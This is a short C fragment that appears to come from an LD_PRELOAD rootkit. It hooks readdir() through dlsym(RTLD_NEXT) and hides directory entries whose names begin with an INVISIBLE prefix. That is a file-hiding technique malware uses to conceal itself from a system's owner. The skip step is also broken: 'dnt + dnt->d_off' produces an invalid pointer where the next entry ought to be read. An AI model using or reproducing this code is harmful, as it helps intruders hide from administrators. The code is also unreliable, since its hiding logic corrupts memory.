readdir_t result = dlsym(RTLD_NEXT, "readdir");
struct dirent* dnt = result(dir);

if (dnt == NULL)
{
	return NULL;
}

if (strncmp(INVISIBLE, dnt->d_name, 10) == 0)
{
	return dnt + dnt->d_off;
}
else
{
	return dnt;
}
